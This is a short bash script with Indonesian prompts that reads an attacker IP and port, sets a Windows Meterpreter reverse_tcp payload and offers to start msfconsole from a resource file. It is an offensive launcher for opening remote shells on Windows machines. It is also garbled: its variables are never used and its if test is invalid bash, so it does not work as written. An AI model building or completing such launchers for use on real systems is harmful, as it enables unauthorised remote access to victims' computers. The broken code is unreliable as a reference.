#!/usr/bin/env bash


pwned='pw_exec.py'

echo " Masukkan IP anda :"
read ip;
echo " Masukkan PORT ANDA :"
read port;

payload=windows/meterpreter/reverse_tcp

echo "Do you want to start metasploit ?? y or n"
read start;
if(start == "y" || start == "Y"); then
  msfconsole -r file.msf
else 
  echo "Bye BYe!!"
fi


